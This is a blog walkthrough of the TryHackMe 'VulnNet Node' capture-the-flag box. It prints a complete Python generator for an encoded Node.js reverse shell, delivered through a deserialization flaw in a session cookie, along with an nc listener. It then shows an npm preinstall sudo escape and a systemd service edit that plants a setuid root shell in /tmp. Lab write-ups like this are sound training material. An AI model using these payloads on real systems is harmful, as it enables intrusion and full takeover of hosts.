---
title: "Try Hack Me - VulnNet Node Walkthrough"
date: 2022-07-27 12:00:00
catagories: [article,walkthrough]
tags: [THM, ctf, easy, linux, express, services ]
---

Continuing on with the VulnNet series, this box is called [VulnNet Node](https://tryhackme.com/room/vulnnetnode).

We start the box by running autorecon. [Click here to see my post on how to use it](https://knox.technology/posts/using_autorecon/)

# Recon

Looking at our `NMAP` scans there appears to only be one port open `8080`

```
PORT     STATE SERVICE REASON         VERSION
8080/tcp open  http    syn-ack ttl 61 Node.js Express framework
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!
```

`NMAP` does tell us that this site is running the Node.js Express framwork.

We take a look at the site:

![](/assets/images/vn_n/login.jpg)

And we find a login page. We could try to brute force, but let's keep looking before we take a sledge hammer to the website.

Using inspect on the page we see that there is a session cookie that is base64 encoded.

![](/assets/images/vn_n/cookie-decode.jpg)

Fun Fact: the `%3D`s at the end of the string are just HTML encoded `=` signs that you would expect at the end of some base64 strings.

We see that the base64 is just some serialized json. Let's use the Burp Suite Decoder tab to help us change the values to username:Admin and isGuest:false

![](/assets/images/vn_n/burp-encode.jpg)

After adding the new cookie and refreshing the page we get an error:

![](/assets/images/vn_n/good-error.jpg)

This is good news because the Express Framework has a vulnerability involving serialized json.

# Exploit serialized json for foothol

Let's google it!!

![](/assets/images/vn_n/google-it.jpg)

Checking out that first website we discover that we can create an evil cookie that will trigger remote code execution.

I found a modified version of the script from this site that works nicely for our purposes:

```python
#!/usr/bin/python
# Generator for encoded NodeJS reverse shells
# Based on the NodeJS reverse shell by Evilpacket
# https://github.com/evilpacket/node-shells/blob/master/node_revshell.js
# Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)
# Insecurety Research (2013) - insecurety.net
import sys
import base64

#if len(sys.argv) != 3:
#    print "Usage: %s <LHOST> <LPORT>" % (sys.argv[0])
#    sys.exit(0)

IP_ADDR = sys.argv[1]
PORT = sys.argv[2]


def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

print("[+] LHOST = " + IP_ADDR)
print("[+] LPORT = " + PORT)
NODEJS_REV_SHELL = '''
var net = require('net');
var spawn = require('child_process').spawn;
HOST="%s";
PORT="%s";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
''' % (IP_ADDR, PORT)
print("[+] Encoding")
print("njs payload: " + NODEJS_REV_SHELL)
PAYLOAD = charencode(NODEJS_REV_SHELL)
PAYLOAD = "eval(String.fromCharCode(" + PAYLOAD + "))"
print(PAYLOAD)

PAYLOAD = '{"rce":"_$$ND_FUNC$$_function (){' + PAYLOAD + '}()"}'
print(PAYLOAD)
PAYLOAD = base64.b64encode(PAYLOAD.encode('ascii'))
print(PAYLOAD)
```

You run the above script like this: `python3 nodeshell.py <RHOST> <RPORT>`

The output will have a base64 string, copy it and use it as the value for the session cookie.

DON'T forget to start your listener!!!

AND SPECIAL NOTE! On this box we will need to use `nano` and I was not able to get a stable shell using `rlwrap` with `nc` I had to use `nc -nvlp 1337` by itself and then use some stablization. 

Refresh the page with the modified cookie:

![](/assets/images/vn_n/foothold.jpg)

# Pivot from www to serv-manage

We drop in as the `www` user. Time to look around and see what we find.

Looking in the `/home` directory we find 2 users:

```
ll
total 16
drwxr-xr-x  4 root        root        4096 Jan 24  2021 ./
drwxr-xr-x 23 root        root        4096 Jan 24  2021 ../
drwxr-x--- 17 serv-manage serv-manage 4096 Jan 24  2021 serv-manage/
drwxr-xr-x  7 www         www         4096 Jan 24  2021 www/
www@vulnnet-node:/home$
```

I copy [LSE](https://github.com/diego-treitos/linux-smart-enumeration) over to the machine with `wget`

When I run it (`./lse.sh -l1`) I immediately notice this:

![](/assets/images/vn_n/sudo.jpg)

So we go to [gtfobins](https://gtfobins.github.io/gtfobins/npm/) and lookup `npm`

We will have to modify the commands slightly from the info on the site:

We need to make sure to `sudo -u serv-manage` because sudo privleges are to run `npm` as serv-manage NOT as root.

Also we use the full path to `npm` to be safe `/usr/bin/npm`

And lastly `chmod 777 -R $TF` - this give full permissions to our temp file and is recursive.

```bash
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
chmod 777 -R $TF
sudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm i
```

It also works as a one-liner!! 
```
TF=$(mktemp -d); echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json; chmod 777 -R $TF; sudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm i
```

You should see somthing like this: 

![](/assets/images/vn_n/serv-manage.jpg)

# Escalate to root

We jump straight to `sudo -l`

![](/assets/images/vn_n/sudo-l.jpg)

And we discover that again we have some `sudo` permissions but this time we can run some commands as root!

Let's use `locate` to find the vulnnet service we have access to and examine it.

```bash
locate vulnnet-auto.timer.timer
ls -lah /etc/systemd/system/vulnnet-auto.timer
cat /etc/systemd/system/vulnnet-auto.timer
```

[](/assets/images/vn_n/service1.jpg)

This service appears to refer to another service `vulnnet-job.service` let's take a look at it too.

```bash
locate vulnnet-auto.timer.timer
ls -lah /etc/systemd/system/vulnnet-job.service
cat /etc/systemd/system/vulnnet-job.service
```

[](/assets/images/vn_n/job-service.jpg)

We need to modify both files.

I used nano, but failed several times before I was able to do it because my shell was unstable.

First we change the interval on the vulnnet-auto.timer to every minute:

```
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/1
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
```

Then we change the vulnnet-job.service:
```
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash'

[Install]
WantedBy=multi-user.target
```

We don't need a shell. In fact, creating a `rootbash` will work better.

After modifing the files we need to navigate to `/tmp` and wait for the creation of our `rootbash`

![](/assets/images/vn_n/rootbash.jpg)

Thanks for reading! 










